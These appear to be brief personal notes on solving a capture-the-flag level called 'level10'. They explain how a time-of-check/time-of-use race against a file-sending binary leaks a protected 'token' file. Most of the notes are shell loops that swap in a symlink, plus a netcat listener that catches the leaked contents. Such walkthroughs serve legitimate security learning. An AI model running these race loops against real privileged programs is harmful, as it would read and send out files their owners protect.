# useful links

http://manpagesfr.free.fr/man/man2/access.2.html

# cmd
* ``ls``
    * 2 objs : 1 binary level10 + 1 file token
* ``./level10``
    ```
	./level10 file host
	 sends file to host if you have access to it
	 ```

 - run the program with a file
 	- `./level10 file 0.0.0.0`
 	- `nc -l 6969` : start listening at port 6969

		```
		.*( )*.
		contents-of-the-file
		```
 - open 3 terminals and run folowing commands at the same time
	- `while true ; do echo "not this file" > file; chmod 777 file; ln -s -f token file; rm file; done`

	- `while true; do ./level10 file 0.0.0.0; done`

	- `while true; do nc -l 6969; done`